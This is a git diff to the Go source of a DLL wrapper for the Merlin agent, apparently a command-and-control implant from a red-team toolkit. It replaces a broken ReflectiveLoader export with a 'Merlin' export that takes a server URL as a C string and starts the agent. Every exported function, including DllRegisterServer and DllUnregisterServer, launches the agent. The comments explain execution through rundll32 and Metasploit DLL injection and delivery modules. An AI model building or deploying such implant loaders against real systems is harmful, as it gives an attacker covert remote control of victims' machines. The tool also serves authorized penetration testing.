@@ -28,7 +28,7 @@ import (
 	"github.com/Ne0nd0g/merlin/pkg/agent"
 )
 
-var url = "https://127.0.0.1:443/"
+var url = "https://127.0.0.1:443"
 
 func main() {}
 
@@ -41,9 +41,10 @@ func run(URL string) {
 // EXPORTED FUNCTIONS
 
 //export Run
-// Run is the main function used to start the Merlin agent taking 1 argument for the Merlin server's address
+// Run is designed to work with rundll32.exe to execute a Merlin agent.
+// The function will process the command line arguments in spot 3 for an optional URL to connect to
 func Run() {
-	// If using rundll32 spot 0 is "rundll32", spot 1 is "merlin.dll,VoidFunc"
+	// If using rundll32 spot 0 is "rundll32", spot 1 is "merlin.dll,Run"
 	if len(os.Args) >= 3 {
 		if strings.HasPrefix(strings.ToLower(os.Args[0]), "rundll32") {
 			url = os.Args[2]
@@ -72,10 +73,15 @@ func DllRegisterServer() { run(url) }
 // https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
 func DllUnregisterServer() { run(url) }
 
-//export ReflectiveLoader
-// ReflectiveLoader is used when calling Metasploit's windows/manage/reflective_dll_inject module.
-// This is broken and causes the process to crash
-func ReflectiveLoader() { run(url) }
+//export Merlin
+// Merlin is an exported function that takes in a C *char, converts it to a string, and executes it.
+// Intended to be used with DLL loading
+func Merlin(u *C.char) {
+	if len(C.GoString(u)) > 0 {
+		url = C.GoString(u)
+	}
+	run(url)
+}
 
 // TODO add entry point of 0 (yes a zero) for use with Metasploit's windows/smb/smb_delivery
 // TODO move exported functions to merlin.c to handle them properly and only export Run()
